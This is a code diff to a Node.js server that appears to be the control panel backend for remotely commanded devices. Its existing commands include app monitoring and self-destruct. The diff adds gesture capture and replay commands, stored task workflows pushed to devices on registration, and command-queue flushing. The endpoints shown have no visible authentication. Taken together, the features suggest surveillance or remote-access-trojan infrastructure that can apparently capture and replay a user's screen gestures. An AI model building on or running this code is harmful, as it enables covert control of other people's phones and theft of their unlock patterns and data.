@@ -158,6 +158,14 @@ const COMMANDS = {
     remove_monitored_app:        { category: 'app_manager', label: 'Stop Monitoring App',   icon: '📡' },
     // Self-destruct
     self_destruct:               { category: 'system',      label: 'Self Destruct',         icon: '💣' },
+    // Gesture Pattern
+    gesture_draw_pattern:        { category: 'gesture',     label: 'Draw Pattern',          icon: '🖊' },
+    gesture_auto_capture_start:  { category: 'gesture',     label: 'Auto-Capture Start',    icon: '⏺' },
+    gesture_auto_capture_stop:   { category: 'gesture',     label: 'Auto-Capture Stop',     icon: '⏹' },
+    gesture_list:                { category: 'gesture',     label: 'List Gestures',         icon: '📋' },
+    gesture_get:                 { category: 'gesture',     label: 'Get Gesture',           icon: '📄' },
+    gesture_replay:              { category: 'gesture',     label: 'Replay Gesture',        icon: '▶️' },
+    gesture_delete:              { category: 'gesture',     label: 'Delete Gesture',        icon: '🗑️' },
 };
 
 // ============================================
@@ -167,6 +175,7 @@ const Device      = require('./models/Device');
 const User        = require('./models/User');
 const Command     = require('./models/Command');
 const ActivityLog = require('./models/ActivityLog');
+const Task        = require('./models/Task');
 
 const authRoutes    = require('./routes/auth');
 const devicesRoutes = require('./routes/devices');
@@ -286,8 +295,12 @@ async function processMessage(clientId, clientType, event, data) {
             await dev.save();
         } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }
 
+        // Load saved tasks from MongoDB and send them to the device
+        let deviceTasks = [];
+        try { deviceTasks = await Task.find({ deviceId }).sort({ updatedAt: -1 }).lean(); } catch (_) {}
+
         // Ack back to device
-        if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId });
+        if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });
 
         // Notify dashboards
         broadcastDash('device:connected', { deviceId, deviceInfo, timestamp: new Date() });
@@ -678,6 +691,40 @@ app.get('/api/devices/:deviceId', async (req, res) => {
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
+// ── Flush pending command queue — called automatically at limit or on demand ──
+function flushPendingQueue(deviceId) {
+    const toFlush = deviceId
+        ? [...pendingCmds.entries()].filter(([, p]) => p.deviceId === deviceId)
+        : [...pendingCmds.entries()];
+
+    for (const [cid, pending] of toFlush) {
+        clearTimeout(pending.timer);
+        if (pending.sseId) sseSend(pending.sseId, 'command:result', {
+            commandId: cid, command: pending.command, deviceId: pending.deviceId,
+            success: false, error: 'Queue reset — too many pending commands',
+            timestamp: new Date()
+        });
+        pendingCmds.delete(cid);
+    }
+
+    if (toFlush.length) {
+        log('CMD', `Queue flushed — cleared ${toFlush.length} pending commands${deviceId ? ' for ' + deviceId : ''}`, 'warn');
+        broadcastDash('queue:reset', { deviceId: deviceId || null, cleared: toFlush.length, timestamp: new Date() });
+
+        // Signal the device to reset its connection so it reconnects cleanly
+        const targets = deviceId ? [deviceId] : [...new Set(toFlush.map(([, p]) => p.deviceId))];
+        for (const did of targets) {
+            const tcpId = deviceToTcp.get(did);
+            const tc    = tcpId ? tcpClients.get(tcpId) : null;
+            if (tc && tc.writable) {
+                tcpSend(tc, 'connection:reset', { reason: 'queue_overflow', timestamp: Date.now() });
+            }
+        }
+    }
+}
+
+const PENDING_CMD_LIMIT = 39;
+
 app.post('/api/commands', async (req, res) => {
     const { deviceId, command, params, sseClientId } = req.body;
     if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
@@ -686,6 +733,16 @@ app.post('/api/commands', async (req, res) => {
     const tcpConnId = deviceToTcp.get(deviceId);
     const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
     if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });
+
+    // ── Queue overflow protection: flush at PENDING_CMD_LIMIT ──
+    const devicePendingCount = [...pendingCmds.values()].filter(p => p.deviceId === deviceId).length;
+    if (devicePendingCount >= PENDING_CMD_LIMIT) {
+        flushPendingQueue(deviceId);
+        return res.status(429).json({
+            error: `Queue limit (${PENDING_CMD_LIMIT}) reached — queue has been reset. Retry your command.`,
+            queueReset: true, deviceId
+        });
+    }
 
     const commandId = crypto.randomBytes(12).toString('hex');
 
@@ -709,6 +766,43 @@ app.post('/api/commands', async (req, res) => {
     // Respond immediately so the browser isn't blocked waiting
     res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
     log('CMD', `${command} → ${deviceId} [${commandId}]`);
+});
+
+// ── Manual queue flush endpoint ───────────────────────────────────────────────
+app.post('/api/commands/flush', (req, res) => {
+    const { deviceId } = req.body || {};
+    flushPendingQueue(deviceId || null);
+    res.json({ success: true, message: 'Queue flushed', pendingBefore: pendingCmds.size });
+});
+
+// ── Task Studio — MongoDB-backed workflow storage ─────────────────────────────
+app.get('/api/tasks/:deviceId', async (req, res) => {
+    try {
+        const tasks = await Task.find({ deviceId: req.params.deviceId }).sort({ updatedAt: -1 });
+        res.json({ success: true, tasks });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/api/tasks', async (req, res) => {
+    const { deviceId, name, steps, _id } = req.body || {};
+    if (!deviceId || !name) return res.status(400).json({ success: false, error: 'deviceId and name required' });
+    try {
+        let task;
+        if (_id) {
+            task = await Task.findByIdAndUpdate(_id, { name, steps: steps || [], updatedAt: new Date() }, { new: true });
+            if (!task) return res.status(404).json({ success: false, error: 'Task not found' });
+        } else {
+            task = await new Task({ deviceId, name, steps: steps || [] }).save();
+        }
+        res.json({ success: true, task });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.delete('/api/tasks/:taskId', async (req, res) => {
+    try {
+        await Task.findByIdAndDelete(req.params.taskId);
+        res.json({ success: true });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
 app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));
